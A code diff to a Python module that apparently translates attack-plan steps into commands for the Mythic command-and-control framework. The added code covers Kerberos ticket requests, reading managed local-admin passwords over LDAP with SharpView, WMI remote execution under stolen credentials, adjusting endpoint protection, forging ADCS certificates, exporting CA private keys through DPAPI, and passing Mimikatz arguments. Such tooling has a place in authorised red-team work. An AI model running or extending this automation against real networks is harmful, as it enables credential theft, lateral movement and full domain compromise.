+            missing=["kerberos-service-ticket-acquire-provider"],
+            reason="no provider preserves the requested Kerberos service-ticket acquisition context",
+        )
+
+    service = _kerberos_service_ticket_spn(
+        parameters.get("service")
+        or parameters.get("spn")
+        or parameters.get("resource")
+        or parameters.get("proof_resource")
+        or parameters.get("service_resource")
+        or "{{kerberos_service_resource}}",
+    )
+    if not service:
+        return MythicCapabilityCommandPlan(
+            False,
+            missing=["service"],
+            reason="Kerberos service-ticket acquisition needs a target service",
+        )
+
+    consumes = ["kerberos_current_tickets_purged"]
+    deferred = "{{" in service
+    if deferred:
+        consumes.append("kerberos_service_resource")
+    if provider.name == "windows-klist-get":
+        if _normalize(provider.command) == "run":
+            return _run_command(
+                step,
+                config,
+                provider.executable,
+                f"get {service}",
+                command=provider.command,
+                consumes=consumes,
+                produces=["kerberos_service_ticket_acquired"],
+                deferred=deferred,
+            )
+        shell_command = f"{provider.executable} get {service}"
+        return _shell_command(
+            step,
+            config,
+            shell_command,
+            consumes=consumes,
+            produces=["kerberos_service_ticket_acquired"],
+            deferred=deferred,
+        )
+
+    return MythicCapabilityCommandPlan(
+        False,
+        missing=["kerberos-service-ticket-acquire-provider"],
+        reason=f"unsupported Kerberos service-ticket acquisition provider: {provider.name}",
+    )
 
 
 def _kerberos_context_service_proof_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
@@ -948,6 +1386,8 @@ def _kerberos_context_service_proof_command(step: Any, config: dict[str, Any]) -
     requires_import = _input_bool(parameters, "requires_import", default=not current_context)
     if current_context and not requires_import:
         consumes = ["kerberos_context_inventory"]
+        if _input_bool(parameters, "requires_acquisition", default=False):
+            consumes.append("kerberos_service_ticket_acquired")
     else:
         consumes = ["kerberos_ticket_imported", "kerberos_logon_context"]
     deferred = "{{" in resource
@@ -997,6 +1437,42 @@ def _ldap_managed_local_admin_secret_read_command(step: Any, config: dict[str, A
         "dNSHostName",
         "sAMAccountName",
     ]
+    provider = operation_providers.select_operation_provider(
+        "ldap-managed-local-admin-secret-read",
+        config=config,
+        context="current-agent-cache",
+    )
+    if provider is not None and provider.name == "managed-sharpview-computer-attribute-read":
+        translated = _inprocess_dotnet_tool_command(
+            step,
+            config,
+            provider,
+            provider.tool,
+            _sharpview_managed_secret_args(
+                target_host,
+                target_domain,
+                domain_controller,
+                search_base,
+                attributes,
+            ),
+        )
+        if not translated.ok:
+            return translated
+        if len(translated.commands) < 2:
+            return MythicCapabilityCommandPlan(
+                False,
+                missing=["inprocess_dotnet_commands"],
+                reason="managed current-session directory read needs load and invoke commands",
+            )
+        return MythicCapabilityCommandPlan(True, commands=[
+            replace(translated.commands[0], expected_probe=""),
+            _command_with_artifacts(
+                translated.commands[1],
+                consumes=["kerberos_account_context"],
+                produces=["managed_local_admin_secret_probe"],
+            ),
+        ])
+
     script = _managed_secret_powershell(domain_controller, search_base, target_host, target_domain, attributes)
     command = _adapter_text(config, "managed_secret_read_command", _adapter_text(config, "ldap_query_command", "powerpick"))
     if not command:
@@ -1067,8 +1543,9 @@ def _local_admin_logon_session_create_command(step: Any, config: dict[str, Any])
         mythic_parameters = {
             _adapter_text(config, "logon_username_param", "username"): username,
             _adapter_text(config, "logon_password_param", "password"): password,
-            netonly_param: bool(parameters.get("netonly", True)),
         }
+        if netonly_param:
+            mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
     else:
         mythic_parameters = {
             credential_param: {
@@ -1077,8 +1554,9 @@ def _local_admin_logon_session_create_command(step: Any, config: dict[str, Any])
                 "credential": password,
                 "type": "plaintext",
             },
-            netonly_param: bool(parameters.get("netonly", True)),
         }
+        if netonly_param:
+            mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
     process_param = _adapter_text(config, "logon_process_param", "")
     process = _text(parameters.get("process"))
     if process_param and process:
@@ -1199,9 +1677,7 @@ def _local_admin_remote_command(step: Any, config: dict[str, Any]) -> MythicCapa
         )
         if not translated.ok:
             return translated
-        return MythicCapabilityCommandPlan(True, commands=[
-            _command_with_artifacts(translated.commands[0], produces=["remote_process_created"]),
-        ])
+        return _plan_with_terminal_artifacts(translated, produces=["remote_process_created"])
     if _normalize(command) in {"shell"}:
         shell_args = _native_windows_remote_exec_shell(parameters, config)
         if not shell_args:
@@ -1404,6 +1880,7 @@ def _native_windows_remote_exec_run_commands(
                 )
             )
         return commands
+    context_reset_commands = _explicit_credential_run_reset_commands(step, config)
     if method in {"powershell-wmi", "powershell_wmi", "ps-wmi", "ps_wmi"}:
         powershell = _native_windows_remote_exec_powershell(
             host=host,
@@ -1416,6 +1893,7 @@ def _native_windows_remote_exec_run_commands(
             wait_seconds=_adapter_text(config, "native_remote_exec_wait_seconds", "6") or "6",
         )
         return [
+            *context_reset_commands,
             MythicCapabilityCommand(
                 command=command,
                 parameters={
@@ -1430,6 +1908,7 @@ def _native_windows_remote_exec_run_commands(
             )
         ]
     return [
+        *context_reset_commands,
         MythicCapabilityCommand(
             command=command,
             parameters={
@@ -1501,6 +1980,25 @@ def _native_windows_remote_exec_run_commands(
             consumes=["admin_share_authenticated", "remote_process_created"],
             produces=["remote_execution_proof"],
         ),
+    ]
+
+
+def _explicit_credential_run_reset_commands(
+    step: Any,
+    config: dict[str, Any],
+) -> list[MythicCapabilityCommand]:
+    context_reset_command = _adapter_text(config, "explicit_credential_remote_exec_reset_command", "")
+    if not context_reset_command:
+        return []
+    return [
+        MythicCapabilityCommand(
+            command=context_reset_command,
+            parameters={},
+            capability=_text(getattr(step, "capability", "")),
+            purpose="clear any stored impersonation token before explicit-credential child-process remote execution",
+            expected_probe="",
+            prerequisites=[],
+        )
     ]
 
 
@@ -1774,6 +2272,12 @@ def _endpoint_protection_adjustment_command(step: Any, config: dict[str, Any]) -
             _adapter_text(config, "run_executable_param", "executable"): "powershell.exe",
             _adapter_text(config, "run_arguments_param", "arguments"): _powershell_encoded_args(script),
         }
+        commands = (
+            _explicit_credential_run_reset_commands(step, config)
+            if method in {"remote-wmi", "wmi", "remote"} else []
+        )
+        commands.append(_command_from_step(step, command, mythic_parameters, produces=["endpoint_protection_probe"]))
+        return MythicCapabilityCommandPlan(True, commands=commands)
     elif normalized_command == "shell":
         mythic_parameters = {
             _adapter_text(config, "shell_arguments_param", "arguments"): "powershell.exe " + _powershell_encoded_args(script),
@@ -1818,7 +2322,7 @@ def _adcs_certificate_forge_command(step: Any, config: dict[str, Any]) -> Mythic
     missing = []
     if not ca_pfx_path:
         missing.append("ca_pfx_path")
-    if not subject:
+    if not subject and not _input_bool(config, "certificate_forge_omit_subject", default=False):
         missing.append("subject")
     if not subject_alt_name:
         missing.append("subject_alt_name")
@@ -1851,12 +2355,13 @@ def _adcs_certificate_forge_command(step: Any, config: dict[str, Any]) -> Mythic
             "forge",
             "--ca-cert", _quote_cli(ca_pfx_path),
             "--ca-pass", _quote_cli(ca_pfx_password),
-            "--subject", _quote_cli(subject),
             "--upn", _quote_cli(subject_alt_name),
         ]
+        if subject and not _input_bool(config, "certificate_forge_omit_subject", default=False):
+            pieces.extend(["--subject", _quote_cli(subject)])
         if account_sid:
             pieces.extend(["--sid", _quote_cli(account_sid)])
-        if crl_distribution_points:
+        if crl_distribution_points and not _input_bool(config, "certificate_forge_omit_crl", default=False):
             pieces.extend(["--crl", _quote_cli(crl_distribution_points[0])])
         pieces.extend([
             "--output-path", _quote_cli(forged_pfx_path),
@@ -1865,9 +2370,7 @@ def _adcs_certificate_forge_command(step: Any, config: dict[str, Any]) -> Mythic
     command = _dotnet_tool_command(step, config, tool_name, " ".join(pieces))
     if not command.ok:
         return command
-    return MythicCapabilityCommandPlan(True, commands=[
-        _command_with_artifacts(command.commands[0], produces=["forged_certificate_pfx"]),
-    ])
+    return _plan_with_terminal_artifacts(command, produces=["forged_certificate_pfx"])
 
 
 def _adcs_esc_certificate_enroll_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
@@ -2078,7 +2581,8 @@ def _adcs_ca_private_key_export_command(step: Any, config: dict[str, Any]) -> My
             ),
         ])
     if normalized_command == "run":
-        return MythicCapabilityCommandPlan(True, commands=[
+        commands = [] if use_current_context else _explicit_credential_run_reset_commands(step, config)
+        commands.append(
             MythicCapabilityCommand(
                 command=command,
                 parameters={
@@ -2091,7 +2595,8 @@ def _adcs_ca_private_key_export_command(step: Any, config: dict[str, Any]) -> My
                 prerequisites=prerequisites,
                 produces=["adcs_ca_private_key_material"],
             )
-        ])
+        )
+        return MythicCapabilityCommandPlan(True, commands=commands)
     if normalized_command == "shell":
         shell_param = _adapter_text(config, "shell_arguments_param", "arguments")
         return MythicCapabilityCommandPlan(True, commands=[
@@ -2220,9 +2725,11 @@ def _adcs_ca_private_key_dpapi_export_command(step: Any, config: dict[str, Any])
             prerequisites=prerequisites,
             produces=["dpapi_tool_staged_on_callback"],
         ))
+    staged_tool_consumes = ["dpapi_tool_staged_on_callback"] if commands else []
 
     normalized_command = _normalize(command)
     if normalized_command == "run":
+        commands.extend(_explicit_credential_run_reset_commands(step, config))
         commands.append(MythicCapabilityCommand(
             command=command,
             parameters={
@@ -2233,7 +2740,7 @@ def _adcs_ca_private_key_dpapi_export_command(step: Any, config: dict[str, Any])
             purpose=_text(getattr(step, "purpose", "")),
             expected_probe="extract_adcs_ca_private_key_probe",
             prerequisites=prerequisites,
-            consumes=["dpapi_tool_staged_on_callback"] if commands else [],
+            consumes=staged_tool_consumes,
             produces=["adcs_ca_private_key_material"],
         ))
     elif normalized_command == "shell":
@@ -2246,7 +2753,7 @@ def _adcs_ca_private_key_dpapi_export_command(step: Any, config: dict[str, Any])
             purpose=_text(getattr(step, "purpose", "")),
             expected_probe="extract_adcs_ca_private_key_probe",
             prerequisites=prerequisites,
-            consumes=["dpapi_tool_staged_on_callback"] if commands else [],
+            consumes=staged_tool_consumes,
             produces=["adcs_ca_private_key_material"],
         ))
     else:
@@ -2855,6 +3362,19 @@ def _service_access_resource(value: Any) -> str:
     return normalized
 
 
+def _kerberos_service_ticket_spn(value: Any) -> str:
+    text = _text(value).strip().strip('"')
+    if not text or text.startswith("{{"):
+        return text
+    normalized = text.replace("\\", "/")
+    if normalized.startswith("//"):
+        host = normalized.lstrip("/").split("/", 1)[0]
+        return f"cifs/{host}" if host else ""
+    if "/" in normalized:
+        return normalized
+    return f"cifs/{normalized}"
+
+
 def _managed_secret_powershell(
     domain_controller: str,
     search_base: str,
@@ -2948,6 +3468,62 @@ def _uses_agent_kerberos_cache(parameters: dict[str, Any]) -> bool:
     }
 
 
+def _kerberos_operation_context(current_context: bool, agent_cache: bool) -> str:
+    if current_context and agent_cache:
+        return "current-agent-cache"
+    if current_context:
+        return "current"
+    return "isolated"
+
+
+def _inprocess_dotnet_tool_command(
+    step: Any,
+    config: dict[str, Any],
+    provider: Any,
+    tool_name: str,
+    tool_arguments: str,
+) -> MythicCapabilityCommandPlan:
+    return _build_inprocess_dotnet_tool_command(
+        step,
+        config,
+        load_command=_text(getattr(provider, "setup_command", "")),
+        invoke_command=_text(getattr(provider, "command", "")),
+        tool_name=tool_name,
+        tool_arguments=tool_arguments,
+    )
+
+
+def _build_inprocess_dotnet_tool_command(
+    step: Any,
+    config: dict[str, Any],
+    *,
+    load_command: str,
+    invoke_command: str,
+    tool_name: str,
+    tool_arguments: str,
+) -> MythicCapabilityCommandPlan:
+    load_tool_param = _adapter_text(config, "inprocess_dotnet_load_tool_param", "filename")
+    invoke_tool_param = _adapter_text(config, "inprocess_dotnet_invoke_tool_param", "assembly")
+    invoke_args_param = _adapter_text(config, "inprocess_dotnet_invoke_args_param", "arguments")
+    missing = []
+    if not load_command:
+        missing.append("inprocess_dotnet_load_command")
+    if not invoke_command:
+        missing.append("inprocess_dotnet_invoke_command")
+    if not tool_name:
+        missing.append("tool")
+    if missing:
+        return MythicCapabilityCommandPlan(
+            False,
+            missing=missing,
+            reason="in-process dotnet provider needs load/invoke commands and a tool name",
+        )
+    return MythicCapabilityCommandPlan(True, commands=[
+        _command_from_step(step, load_command, {load_tool_param: tool_name}),
+        _command_from_step(step, invoke_command, {invoke_tool_param: tool_name, invoke_args_param: tool_arguments}),
+    ])
+
+
 def _command_from_step(
     step: Any,
     command: str,
@@ -2962,6 +3538,7 @@ def _command_from_step(
         capability=_text(getattr(step, "capability", "")),
         purpose=_text(getattr(step, "purpose", "")),
         expected_probe=_text(getattr(step, "expected_probe", "")),
+        operation=_normalize(getattr(step, "operation", "")),
         prerequisites=list(getattr(step, "prerequisites", []) or []),
         produces=list(produces or []),
         consumes=list(consumes or []),
@@ -2981,11 +3558,60 @@ def _command_with_artifacts(
         capability=command.capability,
         purpose=command.purpose,
         expected_probe=command.expected_probe,
+        operation=command.operation,
         prerequisites=list(command.prerequisites),
         produces=list(produces or command.produces),
         consumes=list(consumes or command.consumes),
         deferred=command.deferred if deferred is None else bool(deferred),
     )
+
+
+def _plan_with_terminal_artifacts(
+    plan: MythicCapabilityCommandPlan,
+    produces: list[str] | None = None,
+    consumes: list[str] | None = None,
+    deferred: bool | None = None,
+) -> MythicCapabilityCommandPlan:
+    if not plan.ok or not plan.commands:
+        return plan
+    commands = list(plan.commands)
+    commands[-1] = _command_with_artifacts(
+        commands[-1],
+        produces=produces,
+        consumes=consumes,
+        deferred=deferred,
+    )
+    return replace(plan, commands=commands)
+
+
+def _commands_with_operation(
+    commands: list[MythicCapabilityCommand],
+    operation: str,
+) -> list[MythicCapabilityCommand]:
+    if not operation:
+        return list(commands)
+    return [
+        command if command.operation else replace(command, operation=operation)
+        for command in commands
+    ]
+
+
+def _dedupe_redundant_inprocess_setup_commands(
+    commands: list[MythicCapabilityCommand],
+    config: dict[str, Any],
+) -> list[MythicCapabilityCommand]:
+    setup_command = _normalize(config.get("inprocess_dotnet_load_command"))
+    if not setup_command:
+        return list(commands)
+    deduped: list[MythicCapabilityCommand] = []
+    seen_parameters: list[Any] = []
+    for command in commands:
+        if _normalize(command.command) == setup_command:
+            if any(command.parameters == parameters for parameters in seen_parameters):
+                continue
+            seen_parameters.append(command.parameters)
+        deduped.append(command)
+    return deduped
 
 
 def _sharp_gpo_task_args(parameters: dict[str, Any]) -> str:
@@ -2999,6 +3625,26 @@ def _sharp_gpo_task_args(parameters: dict[str, Any]) -> str:
     ]
     if parameters.get("force", True) is not False:
         pieces.append("--Force")
+    return " ".join(pieces)
+
+
+def _sharpview_managed_secret_args(
+    target_host: str,
+    target_domain: str,
+    domain_controller: str,
+    search_base: str,
+    attributes: list[str],
+) -> str:
+    target_identity = f"{target_host}.{target_domain}" if target_domain else target_host
+    pieces = [
+        "Get-DomainComputer",
+        "-Identity", _quote_cli(target_identity),
+        "-Domain", _quote_cli(target_domain),
+        "-Server", _quote_cli(domain_controller),
+        "-SearchBase", _quote_cli(search_base),
+        "-Properties", _quote_cli(",".join(attributes)),
+        "-FindOne",
+    ]
     return " ".join(pieces)
 
 
@@ -3210,6 +3856,14 @@ def _adapter_text(config: dict[str, Any], key: str, default: str) -> str:
     return default
 
 
+def _dotnet_runner_argument_limit(config: dict[str, Any]) -> int:
+    try:
+        value = int(config.get("dotnet_runner_max_argument_bytes") or 0)
+    except (TypeError, ValueError):
+        return 0
+    return value if value > 0 else 0
+
+
 def _input_bool(config: dict[str, Any], key: str, default: bool = False) -> bool:
     if key not in config:
         return bool(default)
@@ -3272,6 +3926,13 @@ def _mimikatz_command_argument(value: Any, config: dict[str, Any]) -> str:
     if len(text) >= 2 and text[0] == '"' and text[-1] == '"':
         return text
     return '"' + text.replace('"', '\\"') + '"'
+
+
+def _mimikatz_parameters(argument_param: str, command_text: str, config: dict[str, Any]) -> dict[str, Any]:
+    parameters = config.get("mimikatz_parameters") if isinstance(config, dict) else None
+    merged = dict(parameters) if isinstance(parameters, dict) else {}
+    merged[argument_param] = command_text
+    return merged
 
 
 def _normalize(value: Any) -> str:
